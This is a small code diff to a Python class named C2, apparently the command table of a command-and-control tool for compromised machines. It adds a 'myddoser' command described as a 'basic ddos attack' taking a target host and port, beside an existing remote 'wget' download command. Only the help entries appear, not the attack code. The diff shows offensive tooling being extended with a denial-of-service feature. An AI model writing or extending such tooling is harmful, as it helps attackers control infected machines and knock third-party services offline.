@@ -350,7 +350,12 @@ class C2():
             'wget': {
                 'method': 'you must first connect to a session to use this command',
                 'description': 'download file from url', 
-                'usage': 'wget <url>'}        
+                'usage': 'wget <url>'},
+            'myddoser' : {
+                'method': 'you must first connect to a session to use this command',
+                'description': 'basic ddos attack', 
+                'usage': 'myddoser <host> <port> <joke>'
+            }
         }
 
         try:
